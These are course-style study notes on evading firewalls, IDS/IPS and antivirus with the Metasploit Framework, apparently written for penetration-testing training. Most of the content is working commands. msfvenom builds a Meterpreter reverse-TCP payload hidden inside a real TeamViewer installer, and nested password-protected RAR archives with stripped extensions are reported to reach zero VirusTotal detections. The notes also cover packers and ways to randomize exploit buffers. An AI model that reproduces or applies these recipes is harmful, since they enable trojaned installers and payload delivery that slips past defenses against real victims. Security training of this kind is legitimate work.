# NOTES — Firewall & IDS/IPS Evasion

## ID
613

## Module
Using the Metasploit Framework

## Kind
notes

## Title
Section 14 — Firewall & IDS/IPS Evasion

## Description
Endpoint vs perimeter defenses, signature/heuristic/stateful/SOC detection methodologies, and three practical MSF evasion levers: backdoored executable templates (`-x`/`-k`), double-archive password-protected payload smuggling, and exploit-code randomization (Offset).

## Tags
metasploit, evasion, ids, ips, av-bypass, msfvenom, packers, executable-templates, archives, rar, virustotal, offset, nop-sled

## Commands
- `msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<ip> LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5`
- `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ip> LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`
- `rar a ~/test.rar -p ~/test.js`
- `mv test.rar test`
- `rar a test2.rar -p test`
- `mv test2.rar test2`
- `msf-virustotal -k <API key> -f <file>`

## Concept Overview
Two zones of defense:
- **Endpoint protection** — host-local AV/antimalware/firewall/anti-DDoS bundles (Avast, ESET/NOD32, Malwarebytes, BitDefender, …).
- **Perimeter protection** — appliances at the network edge enforcing policy between Public ↔ DMZ ↔ Private.

The defender's policies are essentially **allow/deny ACLs** layered over the network, applications, users, files, and DDoS profiles.

## Detection Methodologies
| Method | How it matches you |
|--------|--------------------|
| **Signature-based** | Bytes / patterns compared against a known-attack DB. 100% match → alarm. Easy to fingerprint MSF default binaries. |
| **Heuristic / Statistical Anomaly** | Baseline of normal network behavior; deviation past threshold triggers alarm. APT modus-operandi signatures included. |
| **Stateful Protocol Analysis** | Tracks protocol state; flags events that diverge from accepted definitions of non-malicious activity. |
| **Live-monitoring (SOC)** | Humans + automation in a 24/7 SOC; either auto-action or analyst-action on alarms. |

## What MSF6 Already Gives You
- **AES-encrypted Meterpreter comms** between attacker ↔ target (kills network-IDS signature matching on payload content).
- **In-memory-only** Meterpreter (no disk artifacts post-foothold).
- These still don't help the **initial payload file** sitting on disk before it executes.

## Lever 1 — Backdoored Executable Templates
Embed your payload shellcode into a legitimate executable (e.g., a real TeamViewer installer). Adds heavy obfuscation around the malicious code.
```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k \
  -x ~/Downloads/TeamViewer_Setup.exe \
  -e x86/shikata_ga_nai \
  -a x86 --platform windows \
  -o ~/Desktop/TeamViewer_Setup.exe \
  -i 5
```
| Flag | What it does |
|------|--------------|
| `-x <template>` | Inject payload into this real executable |
| `-k` | Keep the template's normal flow running in a separate thread (otherwise launching the file does nothing visible — suspicious) |
| `-i 5` | 5 iterations of `shikata_ga_nai` |

### Visibility Caveat for `-k`
Even with `-k`, if the target launches the backdoored exe from a **CLI**, a separate window pops up running the payload and stays open until the session ends. From a double-click in Explorer this is usually invisible.

## Lever 2 — Double-Archive Smuggling (Bypass File Scanners)
AV often can't scan password-protected archives. Defender alarms are usually "couldn't scan, requires manual review" — many slip through.

Generate a payload first (any format):
```
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -e x86/shikata_ga_nai -a x86 --platform windows \
  -o ~/test.js -i 5
```
VirusTotal on the raw payload — 11/59 detect.

Now wrap it:
```
# install rar on Linux
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar

# layer 1
rar a ~/test.rar -p ~/test.js            # -p prompts for password
mv test.rar test                         # strip extension

# layer 2 (archive the extension-less archive)
rar a test2.rar -p test
mv test2.rar test2
```
VirusTotal on `test2` — **0/49 detections**. Same payload, just nested and named oddly.

### Detection Caveat
SOC analysts will see "couldn't scan, password-protected archive" alerts. A diligent admin can manually inspect. This is anti-automation, not anti-human.

## Lever 3 — Packers
A **packer** = an executable compression + decompression-stub bundle. The payload is compressed alongside a tiny stub that unpacks it back to a working executable at runtime. Bypasses many signature scanners that don't unpack.

Popular packers (HTB list):
- UPX
- The Enigma Protector
- MPRESS
- Alternate EXE Packer
- ExeStealth
- Morphine
- MEW
- Themida

`msfvenom` natively offers some compression + structure-changing tricks. For deeper coverage see the **PolyPack** project.

## Lever 4 — Custom / Randomized Exploit Code
IPS/IDS database signatures pattern-match on overused exploit buffers (hex patterns in classic BOF probes, identical NOP sleds, etc.).

When porting / writing your own module, **randomize**:
```ruby
'Targets' =>
[
  [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```
Adding an `Offset` switch lets the BOF buffer vary across runs and breaks fixed signatures.

### NOP Sled
- BOF code crashes the service.
- NOP sled is the memory region where shellcode lands.
- **Avoid obvious `\x90\x90\x90...` sleds** — they're a top-three signature pattern. Use alternative single-byte opcodes that act as no-ops on your target arch.

## Detection Reality (from the module's VirusTotal runs)
| Payload | Detections |
|---------|------------|
| Stock `msfvenom` exe (no encoding) | very high |
| `msfvenom` + SGN ×1 | 54/69 |
| `msfvenom` + SGN ×10 | 52/65 |
| `.js` payload + SGN ×5 | 11/59 |
| Same `.js` double-RAR'd + extension stripped | **0/49** |

Conclusion: it's not the encoding doing the work — it's the **delivery wrapper** that defeats automated scanning.

## Key Takeaways
- Encoding alone is not evasion in 2026 — combine with **delivery tricks** (templates, archives, packers) or skip MSF defaults entirely for AV'd targets.
- `-k` + `-x` is the cheapest single upgrade to a default payload — looks like a real installer when double-clicked.
- Double-archive with password and odd extensions defeats most automated scanning pipelines but raises a "couldn't scan" flag a human can act on.
- Randomize anything that has a fixed pattern: `Ret`/`Offset`, NOP sled bytes, payload encoding seed.

## Gotchas
- A backdoored exe launched from a CMD prompt opens a visible window — bad if your social-engineering cover requires silent execution. Wrap in a launcher that double-clicks would normally hit.
- "0 / 49 on VirusTotal" ≠ undetected in the wild. SOC analysts watch for "archive can't be scanned" patterns too.
- Cleanup matters — IIS WebDAV-style exploits leave `metasploit<RAND>.asp` files behind even after a successful session. If stealth is in scope, plan removal.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|using-the-metasploit]]
← [[13-msfvenom]] | [[15-msf-updates]] →
<!-- AUTO-LINKS-END -->
